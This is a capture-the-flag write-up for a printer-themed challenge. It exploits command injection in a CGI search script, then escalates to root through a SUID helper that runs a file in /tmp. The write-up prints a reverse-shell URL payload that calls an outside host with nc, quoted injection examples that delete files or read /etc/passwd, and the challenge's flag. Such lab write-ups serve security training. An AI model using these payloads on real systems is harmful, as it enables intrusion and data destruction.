@@ -1,0 +1,131 @@
+Challenge: Phasing Through Printers
+Category: Miscellaneous
+Author: Soups71
+
+Description:
+
+I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?
+
+Here is some of the code I could dig up.
+
+NOTE
+
+Escalate your privileges and uncover the flag in the root user's home directory.
+
+IMPORTANT
+
+The password to the ZIP archive below is phasing_through_printers.
+
+Solution:
+
+1. Download and extract the challenge files
+
+┌──(ctf㉿kali)-[~/CTF/huntress2025/miscellaneous/phasing_through_printers]
+└─$ 7z x -pphasing_through_printers phasing_through_printers.zip
+
+7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
+ 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 1854 bytes (2 KiB)
+
+Extracting archive: phasing_through_printers.zip
+--
+Path = phasing_through_printers.zip
+Type = zip
+Physical Size = 1854
+
+Everything is Ok
+
+Folders: 2
+Files: 2
+Size:       3479
+Compressed: 1854
+
+2. Review extracted files
+
+┌──(ctf㉿kali)-[~/CTF/huntress2025/miscellaneous/phasing_through_printers]
+└─$ tree 
+.
+├── cgi-bin
+│   └── search.c
+├── phasing_through_printers.zip
+└── www
+    └── index.html
+
+3. I don't know "C" very well but an LLM probably does. I feed the source to Claude.AI and was given this response
+
+This code has a command injection vulnerability. The user input is directly inserted into a shell command without any sanitization. An attacker could inject malicious commands:
+
+	- ?q=test; rm -rf / (delete files)
+	- ?q=test | cat /etc/passwd (read sensitive files)
+	- ?q=test; malicious_command (execute arbitrary code)
+
+This code should never be used in a production environment without proper input validation and sanitization. Consider using safer alternatives like escaping shell arguments or using direct file searching instead of shell commands.
+
+4. I chose to spawn a reverse shell
+
+	http://10.1.41.178/cgi-bin/search.cgi?q=%3Bnc+-c+sh+<my-vps-ip>+80;
+
+5. I upgraded my shell to something slightly more interactive
+
+	python3 -c 'import pty;pty.spawn("/bin/bash")'
+	www-data@70467f939e73:/usr/lib/cgi-bin$ id
+	id
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+6. Reading the flag directly would be too easy, we need to upgrade our permissions
+
+	www-data@70467f939e73:/usr/lib/cgi-bin$ cat /root/flag.txt
+	cat /root/flag.txt
+	cat: /root/flag.txt: Permission denied
+
+7. Searching for SUID/SGID binaries we come across "/usr/local/bin/admin_help"
+
+	www-data@70467f939e73:/usr/lib/cgi-bin$ find / -perm -u=s -type f 2>/dev/null
+	find / -perm -u=s -type f 2>/dev/null
+	/usr/bin/mount
+	/usr/bin/chfn
+	/usr/bin/passwd
+	/usr/bin/umount
+	/usr/bin/gpasswd
+	/usr/bin/su
+	/usr/bin/newgrp
+	/usr/bin/chsh
+	/usr/local/bin/admin_help
+
+	a. Running the binary we get the following output
+
+		www-data@70467f939e73:/usr/lib/cgi-bin$ /usr/local/bin/admin_help
+        /usr/local/bin/admin_help
+	    Your wish is my command... maybe :)
+	    Error opening original file: No such file or directory
+	    Bad String in File.
+
+   b. Looking through the strings of the file, we find some interesting artifacts
+
+		/tmp/wisUSH
+		wish.sh
+		[]A\
+		[]A\
+		Error opening original file
+		Bad String in File.
+		Your wish is my command... maybe :)
+		chmod +x /tmp/wish.sh && /tmp/wish.sh
+
+8. We can now "make a wish" that we know "admin_help" runs whatever is in "/tmp/wish.sh" as root
+
+	www-data@70467f939e73:/usr/lib/cgi-bin$ echo "cat /root/flag.txt" > /tmp/wish.sh
+	<b/cgi-bin$ echo "cat /root/flag.txt" > /tmp/wish.sh
+	www-data@70467f939e73:/usr/lib/cgi-bin$ cat /tmp/wish.sh
+	cat /tmp/wish.sh
+	cat /root/flag.txt
+
+	a. Now when we run "admin_help" we get this output
+
+		www-data@70467f939e73:/usr/lib/cgi-bin$ /usr/local/bin/admin_help
+		/usr/local/bin/admin_help
+		Your wish is my command... maybe :)
+		flag{93541544b91b7d2b9d61e90becbca309}
+
+Flag: flag{93541544b91b7d2b9d61e90becbca309}
